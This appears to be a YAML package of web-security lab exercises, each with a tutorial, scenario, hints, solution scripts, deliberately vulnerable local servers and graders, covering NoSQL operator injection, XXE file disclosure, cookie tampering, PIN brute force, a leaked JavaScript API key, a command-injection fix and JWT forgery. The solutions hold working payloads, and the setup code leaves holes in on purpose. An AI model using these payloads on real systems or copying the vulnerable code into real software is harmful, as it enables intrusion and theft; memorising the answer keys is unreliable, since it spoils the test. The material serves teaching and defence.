- id: offsec-web-034
  title: Authentication bypass with a type confusion
  difficulty: 3
  kind: build
  tags: [web, nosql, type-confusion, auth-bypass, api]
  tutorial: |
    **Concept.** JSON lets a field be a string **or** a structured value.
    When a login handler compares the stored password to a user-supplied value
    without checking its **type**, you can send an object the comparison treats
    as "always true" — the classic `{"$ne": null}` of NoSQL injection, or here
    a wildcard the matcher honours. The fix is to require a string and compare
    exactly.

    **Read up on:**
    - NoSQL injection / operator injection (`$ne`, `$gt`, `$regex`)
    - Type checking untrusted input before using it
  scenario: |
    The API login at **`http://127.0.0.1:8093/login`** takes JSON
    `{"user": ..., "pass": ...}`. If `pass` is an **object** `{"$ne": ""}` the
    matcher returns the first row regardless of the real password. Log in as
    **`admin`** without the password and read the flag it returns; write the
    `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "`{\"user\":\"admin\",\"pass\":\"wrong\"}` fails."
    - "`{\"user\":\"admin\",\"pass\":{\"$ne\":\"\"}}` makes the password check pass."
    - "`curl -s -X POST http://127.0.0.1:8093/login -d '{\"user\":\"admin\",\"pass\":{\"$ne\":\"\"}}'`."
  solution: |
    ```bash
    curl -s -X POST http://127.0.0.1:8093/login -d '{"user":"admin","pass":{"$ne":""}}' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target nosqli 8093 <<'PY'
    import os, json, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8093"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    users = {"admin": os.urandom(8).hex(), "guest": "guest"}
    def matches(stored, supplied):
        if isinstance(supplied, dict):
            if "$ne" in supplied:
                return stored != supplied["$ne"]
            if "$gt" in supplied:
                return stored > supplied["$gt"]
        return stored == supplied
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_POST(self):
            if self.path != "/login":
                self.send_response(404); self.end_headers(); return
            n = int(self.headers.get("Content-Length", "0"))
            try:
                d = json.loads(self.rfile.read(n) or b"{}")
            except Exception:
                d = {}
            u = d.get("user"); p = d.get("pass")
            ok = u in users and matches(users[u], p)
            b = (("Welcome admin. Flag: " + FLAG) if (ok and u == "admin") else "login failed").encode()
            self.send_response(200 if ok else 401); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            self.send_response(200); self.end_headers(); self.wfile.write(b'POST /login {"user","pass"}')
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    curl -s -X POST http://127.0.0.1:8093/login -d '{"user":"admin","pass":{"$ne":""}}' | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-035
  title: An XML parser that resolves entities
  difficulty: 3
  kind: build
  tags: [web, xxe, xml, file-disclosure]
  tutorial: |
    **Concept.** **XXE** (XML external entity) injection abuses an XML parser
    that resolves entity declarations in the document. A `<!DOCTYPE>` with a
    `SYSTEM` entity pointing at a local file (`file:///etc/passwd`) makes the
    parser **read that file** and splice its contents into the response. The
    fix is to disable DTDs and external entities.

    **Read up on:**
    - XML `<!DOCTYPE>`, `<!ENTITY ... SYSTEM "file://...">`
    - Hardening parsers (`resolve_entities=False`, `defusedxml`)
  scenario: |
    The import endpoint at **`http://127.0.0.1:8094/import`** accepts an XML
    `POST` body and echoes the `<name>` field. Its parser resolves external
    entities. The flag is in **`/flag.txt`** on the server.

    Craft an XXE payload that reads `/flag.txt` into the echoed field, and
    write the `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "Normal body: `<user><name>Ana</name></user>`."
    - "Declare an entity and reference it: `<!DOCTYPE u [<!ENTITY x SYSTEM \"file:///flag.txt\">]>` then `<name>&x;</name>`."
    - "`curl -s -X POST --data-binary @payload.xml http://127.0.0.1:8094/import`."
  solution: |
    ```bash
    cat > /tmp/xxe.xml <<'XML'
    <?xml version="1.0"?>
    <!DOCTYPE user [<!ENTITY x SYSTEM "file:///flag.txt">]>
    <user><name>&x;</name></user>
    XML
    curl -s -X POST --data-binary @/tmp/xxe.xml http://127.0.0.1:8094/import \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target xxe 8094 <<'PY'
    import os, re, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8094"))
    open("/flag.txt", "w").write(os.environ.get("FLAG", "KL{missing}") + "\n")
    os.chmod("/flag.txt", 0o644)
    def parse(xml):
        # a naive parser: expand <!ENTITY name SYSTEM "file://..."> references
        ents = {}
        for m in re.finditer(r'<!ENTITY\s+(\w+)\s+SYSTEM\s+"file://([^"]+)"\s*>', xml):
            try:
                ents[m.group(1)] = open(m.group(2)).read()
            except Exception:
                ents[m.group(1)] = ""
        body = re.sub(r'<!DOCTYPE.*?\]>', '', xml, flags=re.S)
        for k, v in ents.items():
            body = body.replace("&%s;" % k, v)
        m = re.search(r"<name>(.*?)</name>", body, re.S)
        return m.group(1) if m else ""
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_POST(self):
            if self.path != "/import":
                self.send_response(404); self.end_headers(); return
            n = int(self.headers.get("Content-Length", "0"))
            name = parse(self.rfile.read(n).decode("utf-8", "replace"))
            b = ("Imported user: " + name).encode()
            self.send_response(200); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            self.send_response(200); self.end_headers(); self.wfile.write(b"POST XML to /import")
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    cat > /tmp/xxe.xml <<'XML'
    <?xml version="1.0"?>
    <!DOCTYPE user [<!ENTITY x SYSTEM "file:///flag.txt">]>
    <user><name>&x;</name></user>
    XML
    curl -s -X POST --data-binary @/tmp/xxe.xml http://127.0.0.1:8094/import | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    rm -f /tmp/xxe.xml

- id: offsec-web-036
  title: The role cookie you can rewrite
  difficulty: 2
  kind: build
  tags: [web, cookies, integrity, access-control]
  tutorial: |
    **Concept.** A cookie that carries **authorization state** but isn't
    integrity-protected is attacker-controlled. If `role=user` is just sitting
    in a cookie, you change it to `role=admin`. Even base64 or JSON "encoding"
    is not protection — only a signature (or server-side sessions) stops
    tampering.

    **Read up on:**
    - Cookie tampering
    - Signed cookies / server-side session stores
  scenario: |
    **`http://127.0.0.1:8095/`** sets a cookie **`session`** holding a
    base64-encoded JSON object `{"user":"guest","role":"user"}`. The page
    **`/panel`** returns the flag to `role=admin`.

    Tamper the cookie to become admin, read `/panel`, and write the `KL{...}`
    token to **`/lab/flag.txt`**.
  hints:
    - "Decode the cookie: `printf %s \"$cookie\" | base64 -d`."
    - "Change `user` to `admin`, re-encode, and send it back."
    - "`new=$(printf '%s' '{\"user\":\"attacker\",\"role\":\"admin\"}' | base64 -w0)`."
  solution: |
    ```bash
    new=$(printf '%s' '{"user":"attacker","role":"admin"}' | base64 -w0)
    curl -s -H "Cookie: session=$new" http://127.0.0.1:8095/panel | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target rolecookie 8095 <<'PY'
    import os, json, base64, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8095"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _c(self):
            for kv in (self.headers.get("Cookie") or "").split(";"):
                if kv.strip().startswith("session="):
                    try:
                        return json.loads(base64.b64decode(kv.strip()[8:] + "=="))
                    except Exception:
                        return {}
            return {}
        def do_GET(self):
            if self.path == "/panel":
                sess = self._c()
                ok = sess.get("role") == "admin"
                b = (("Admin panel. Flag: " + FLAG) if ok else "forbidden").encode()
                self.send_response(200 if ok else 403); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b); return
            cookie = base64.b64encode(json.dumps({"user": "guest", "role": "user"}).encode()).decode()
            b = b"Logged in as guest. Try /panel"
            self.send_response(200); self.send_header("Set-Cookie", "session=" + cookie)
            self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    new=$(printf '%s' '{"user":"attacker","role":"admin"}' | base64 -w0)
    curl -s -H "Cookie: session=$new" http://127.0.0.1:8095/panel | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-037
  title: Brute-force the four-digit PIN
  difficulty: 2
  kind: build
  tags: [web, brute-force, rate-limiting, authentication]
  tutorial: |
    **Concept.** A short numeric secret with **no rate limiting** is brute-
    forceable. A 4-digit PIN is only 10,000 possibilities, seconds for a
    script. The lesson cuts both ways: attackers enumerate small key spaces,
    and defenders must add lockouts, back-off and longer secrets.

    **Read up on:**
    - Online brute force and why rate limiting matters
    - Hydra's `http-post-form`, or a simple request loop
  scenario: |
    The device portal at **`http://127.0.0.1:8096/unlock`** checks a 4-digit
    PIN sent as `pin=NNNN` and returns the flag on the right one. There's no
    lockout. Find the PIN, read the flag, and write the `KL{...}` token to
    **`/lab/flag.txt`**.
  hints:
    - "Loop `0000`–`9999` and look for a response that isn't `wrong pin`."
    - "`for p in $(seq -w 0 9999); do ...; done` (seq -w zero-pads)."
  solution: |
    ```bash
    for p in $(seq -w 0 9999); do
      r=$(curl -s "http://127.0.0.1:8096/unlock?pin=$p")
      case "$r" in *KL\{*) echo "$r" | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt; break;; esac
    done
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target pinbrute 8096 <<'PY'
    import os, random, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8096"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    PIN = "%04d" % random.randint(0, 9999)
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            q = urllib.parse.urlparse(self.path)
            if q.path != "/unlock":
                self.send_response(200); self.end_headers(); self.wfile.write(b"/unlock?pin=NNNN"); return
            pin = urllib.parse.parse_qs(q.query).get("pin", [""])[0]
            b = (("unlocked. Flag: " + FLAG) if pin == PIN else "wrong pin").encode()
            self.send_response(200); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    for p in $(seq -w 0 9999); do
      r=$(curl -s "http://127.0.0.1:8096/unlock?pin=$p")
      case "$r" in *KL\{*) echo "$r" | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt; break;; esac
    done

- id: offsec-web-038
  title: The API key left in the JavaScript
  difficulty: 2
  kind: build
  tags: [web, recon, secrets, source-disclosure, api]
  tutorial: |
    **Concept.** Front-end code is public. Secrets committed into a JavaScript
    bundle — API keys, internal endpoints, feature flags — are readable by
    anyone who opens the file. "Hidden" admin endpoints referenced from the JS
    are not hidden. Always read the client-side source during recon.

    **Read up on:**
    - Reading `/static/*.js` during recon
    - Why client-side code must never hold secrets
  scenario: |
    The app at **`http://127.0.0.1:8097/`** loads
    **`/static/app.js`**, which contains a hardcoded admin **API key** and the
    path of an admin endpoint. That endpoint returns the flag when called with
    the key in the **`X-API-Key`** header.

    Recover the key from the JS, call the admin endpoint, and write the
    `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "`curl -s http://127.0.0.1:8097/static/app.js` and read the constants."
    - "It defines `API_KEY` and an admin path. Call it: `curl -s -H \"X-API-Key: $KEY\" http://127.0.0.1:8097/<path>`."
  solution: |
    ```bash
    js=$(curl -s http://127.0.0.1:8097/static/app.js)
    key=$(sed -n 's/.*API_KEY *= *"\([^"]*\)".*/\1/p' <<<"$js")
    path=$(sed -n 's#.*fetch("\(/[^"]*\)".*#\1#p' <<<"$js" | head -1)
    curl -s -H "X-API-Key: $key" "http://127.0.0.1:8097$path" | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target jskey 8097 <<'PY'
    import os, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8097"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    KEY = os.urandom(12).hex()
    JS = 'const API_KEY = "%s";\nasync function loadStats(){ return fetch("/api/admin/stats", {headers:{"X-API-Key":API_KEY}}); }\n' % KEY
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            if self.path == "/static/app.js":
                b = JS.encode()
                self.send_response(200); self.send_header("Content-Type", "application/javascript")
                self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b); return
            if self.path == "/api/admin/stats":
                if self.headers.get("X-API-Key") == KEY:
                    b = ("stats. Flag: " + FLAG).encode()
                    self.send_response(200)
                else:
                    b = b"invalid api key"; self.send_response(403)
                self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b); return
            self.send_response(200); self.end_headers(); self.wfile.write(b'<script src="/static/app.js"></script>')
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    js=$(curl -s http://127.0.0.1:8097/static/app.js)
    key=$(sed -n 's/.*API_KEY *= *"\([^"]*\)".*/\1/p' <<<"$js")
    path=$(sed -n 's#.*fetch("\(/[^"]*\)".*#\1#p' <<<"$js" | head -1)
    curl -s -H "X-API-Key: $key" "http://127.0.0.1:8097$path" | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-039
  title: Patch the command injection
  difficulty: 3
  kind: fix
  tags: [web, command-injection, remediation, defense]
  tutorial: |
    **Concept.** The fix for command injection is to **never build a shell
    command from input**. Call the program directly with an argument vector
    (`subprocess.run(["ping", "-c1", host])`, no `shell=True`), so the input is
    one argument and can't add commands. Validate the input too: a hostname or
    IP has a known shape, and anything else is rejected.

    **Read up on:**
    - `subprocess.run([...])` without `shell=True`
    - Input validation (allowlist of hostname/IP characters)
  scenario: |
    **`/lab/pingfix/app.py`** is the ping tool from before: it shells out with
    `os.system("ping -c1 " + host)`. Fix it so that:

    - it **still** pings a normal host and returns the output
    - command injection is **impossible** (`host=x; cat /flag.txt` must not run
      `cat`)
    - the flag file **`/flag.txt`** is never disclosed

    The check runs your app and tries an injection payload.
  hints:
    - "Replace `os.system(...)` with `subprocess.run([\"ping\", \"-c1\", \"-W1\", host], ...)` and no shell."
    - "Reject hosts that aren't plausible: allow only `[A-Za-z0-9.:-]`."
  solution: |
    ```python
    import re, subprocess
    if not re.fullmatch(r"[A-Za-z0-9.:-]+", host or ""):
        out = "invalid host"
    else:
        out = subprocess.run(["ping", "-c1", "-W1", host], capture_output=True, text=True, timeout=5).stdout
    ```
  setup: |
    rm -rf /lab/pingfix; mkdir -p /lab/pingfix
    FLAG=$(rand_flag); echo "$FLAG" > "$KL_STATE/flag"
    lab_file /lab/pingfix/app.py <<'PY'
    import os, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8098"))
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            q = urllib.parse.urlparse(self.path)
            if q.path != "/ping":
                self.send_response(200); self.end_headers(); self.wfile.write(b"/ping?host="); return
            host = urllib.parse.parse_qs(q.query).get("host", [""])[0]
            out = os.popen("ping -c1 -W1 " + host).read()   # vulnerable
            b = ("<pre>" + out + "</pre>").encode()
            self.send_response(200); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    port=8098
    docker rm -f kl-pingfix >/dev/null 2>&1
    cp "$KL_STATE/flag" /lab/pingfix/flag.txt
    docker run -d --name kl-pingfix --restart unless-stopped -p 127.0.0.1:$port:$port -e PORT=$port \
      -v /lab/pingfix/app.py:/app/app.py:ro -v /lab/pingfix/flag.txt:/flag.txt:ro python:3.12-alpine python /app/app.py >/dev/null
    on_reset 'docker rm -f kl-pingfix >/dev/null 2>&1'
    eventually 20 "curl -fsS -o /dev/null 'http://127.0.0.1:$port/ping?host=127.0.0.1'"
    flag=$(cat "$KL_STATE/flag")
    ok=$(curl -s "http://127.0.0.1:$port/ping" --get --data-urlencode 'host=127.0.0.1')
    inj=$(curl -s "http://127.0.0.1:$port/ping" --get --data-urlencode 'host=127.0.0.1; cat /flag.txt')
    sub=$(curl -s "http://127.0.0.1:$port/ping" --get --data-urlencode 'host=$(cat /flag.txt)')
    check "a normal host still pings" 'grep -qiE "bytes from|PING|packets transmitted" <<<"$ok"'
    check_not "the injection does not leak the flag" 'grep -q "$flag" <<<"$inj$sub"'
  solve: |
    cat > /lab/pingfix/app.py <<'PY'
    import os, re, subprocess, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8098"))
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            q = urllib.parse.urlparse(self.path)
            if q.path != "/ping":
                self.send_response(200); self.end_headers(); self.wfile.write(b"/ping?host="); return
            host = urllib.parse.parse_qs(q.query).get("host", [""])[0]
            if not re.fullmatch(r"[A-Za-z0-9.:-]+", host or ""):
                out = "invalid host"
            else:
                out = subprocess.run(["ping", "-c1", "-W1", host], capture_output=True, text=True, timeout=5).stdout
            b = ("<pre>" + out + "</pre>").encode()
            self.send_response(200); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY

- id: offsec-web-040
  title: "Incident: chain your way into the admin API"
  difficulty: 4
  kind: build
  tags: [web, recon, idor, jwt, chaining, incident]
  tutorial: |
    **Concept.** Real intrusions **chain** small flaws: recon reveals an
    endpoint, a weak token gets you a foothold, and an access-control gap turns
    the foothold into full control. No single bug here is exotic; the win comes
    from reading the app carefully and connecting the steps.

    **Read up on:**
    - Combining recon, token forgery and broken access control
    - Working an API methodically from one response to the next
  scenario: |
    The API at **`http://127.0.0.1:8099/`** guards its flag behind three steps:

    1. **Recon.** `GET /` returns JSON hinting at a `debug` endpoint whose path
       is base64-encoded in the response.
    2. **Token.** That debug endpoint issues a signed JWT, but its signing
       secret is leaked in the token's own `kid` header field (a classic
       mistake). Use it to forge a token with `"role":"admin"`.
    3. **Access.** `GET /api/flag` with your admin token (header
       `Authorization: Bearer <jwt>`) returns the flag.

    Work the chain and write the `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "`curl -s http://127.0.0.1:8099/` — base64-decode the `debug` field to get the path."
    - "Call that path, read the JWT it returns, and base64url-decode its header: the `kid` is the HMAC secret."
    - "Forge `{\"role\":\"admin\"}` signed HS256 with that secret, then `curl -s -H \"Authorization: Bearer $JWT\" http://127.0.0.1:8099/api/flag`."
  solution: |
    ```bash
    python3 - <<'PY' > /lab/flag.txt
    import base64, json, hmac, hashlib, urllib.request, re
    def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    def b64d(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    root = json.loads(urllib.request.urlopen("http://127.0.0.1:8099/").read())
    path = base64.b64decode(root["debug"]).decode()
    tok = json.loads(urllib.request.urlopen("http://127.0.0.1:8099" + path).read())["token"]
    h, p, s = tok.split(".")
    secret = json.loads(b64d(h))["kid"]
    hp = b64e(b'{"alg":"HS256","typ":"JWT"}') + "." + b64e(json.dumps({"role": "admin"}).encode())
    sig = b64e(hmac.new(secret.encode(), hp.encode(), hashlib.sha256).digest())
    req = urllib.request.Request("http://127.0.0.1:8099/api/flag", headers={"Authorization": "Bearer " + hp + "." + sig})
    print(re.search(r"KL\{[0-9a-f]+\}", urllib.request.urlopen(req).read().decode()).group())
    PY
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target apichain 8099 <<'PY'
    import os, json, base64, hmac, hashlib, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8099"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    SECRET = os.urandom(10).hex()
    DEBUG = "/debug/token-" + os.urandom(3).hex()
    def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    def b64d(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    def mint(payload):
        h = b64e(('{"alg":"HS256","typ":"JWT","kid":"%s"}' % SECRET).encode())
        p = b64e(json.dumps(payload).encode())
        return h + "." + p + "." + b64e(hmac.new(SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    def verify(tok):
        try:
            h, p, s = tok.split(".")
        except Exception:
            return None
        if hmac.compare_digest(b64e(hmac.new(SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()), s):
            try:
                return json.loads(b64d(p))
            except Exception:
                return None
        return None
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _json(self, code, obj):
            b = json.dumps(obj).encode()
            self.send_response(code); self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            if self.path == "/":
                self._json(200, {"service": "acme-api", "debug": base64.b64encode(DEBUG.encode()).decode()}); return
            if self.path == DEBUG:
                self._json(200, {"token": mint({"role": "guest"})}); return
            if self.path == "/api/flag":
                auth = self.headers.get("Authorization", "")
                payload = verify(auth[7:]) if auth.startswith("Bearer ") else None
                if payload and payload.get("role") == "admin":
                    self._json(200, {"flag": FLAG})
                else:
                    self._json(403, {"error": "admin only"})
                return
            self._json(404, {"error": "not found"})
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    python3 - <<'PY' > /lab/flag.txt
    import base64, json, hmac, hashlib, urllib.request, re
    def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    def b64d(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    root = json.loads(urllib.request.urlopen("http://127.0.0.1:8099/").read())
    path = base64.b64decode(root["debug"]).decode()
    tok = json.loads(urllib.request.urlopen("http://127.0.0.1:8099" + path).read())["token"]
    secret = json.loads(b64d(tok.split(".")[0]))["kid"]
    hp = b64e(b'{"alg":"HS256","typ":"JWT"}') + "." + b64e(json.dumps({"role": "admin"}).encode())
    sig = b64e(hmac.new(secret.encode(), hp.encode(), hashlib.sha256).digest())
    req = urllib.request.Request("http://127.0.0.1:8099/api/flag", headers={"Authorization": "Bearer " + hp + "." + sig})
    print(re.search(r"KL\{[0-9a-f]+\}", urllib.request.urlopen(req).read().decode()).group())
    PY
